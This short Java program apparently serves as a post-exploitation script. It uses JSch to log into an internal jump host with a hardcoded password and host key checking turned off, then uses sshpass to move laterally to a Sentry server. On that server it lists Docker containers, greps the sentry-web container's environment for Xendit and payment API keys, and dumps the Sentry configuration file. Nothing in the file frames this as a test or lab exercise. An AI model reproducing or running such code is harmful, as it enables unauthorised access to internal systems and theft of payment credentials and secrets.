import com.jcraft.jsch.*;
import java.io.*;
class DKJ {
  public static void main(String[] a) throws Exception {
    JSch j = new JSch();
    java.util.Properties p = new java.util.Properties();
    p.put("StrictHostKeyChecking", "no");
    Session jump = j.getSession("user", "10.14.36.23", 22);
    jump.setPassword("kutul0nc4t");
    jump.setConfig(p);
    jump.setTimeout(10000);
    jump.connect();
    // Hop to Sentry via sshpass
    ChannelExec ch = (ChannelExec) jump.openChannel("exec");
    ch.setCommand("sshpass -p kutul0nc4t ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 user@10.13.16.117 'hostname;id;echo ---DOCKER---;docker ps --format \"{{.Names}}|{{.Image}}\" 2>/dev/null;echo ---ENV-XENDIT---;docker exec $(docker ps -q --filter name=sentry-web 2>/dev/null | head -1) env 2>/dev/null | grep -iE \"xendit|xnd_|payment\" | head -10;echo ---SENTRY-CONFIG---;docker exec $(docker ps -q --filter name=sentry-web 2>/dev/null | head -1) cat /etc/sentry/sentry.conf.py 2>/dev/null | head -30' 2>&1 | head -40");
    ch.setInputStream(null);
    InputStream in = ch.getInputStream();
    ch.connect();
    byte[] buf = new byte[8192];
    int i;
    while ((i = in.read(buf)) != -1) System.out.write(buf, 0, i);
    ch.disconnect();
    jump.disconnect();
  }
}
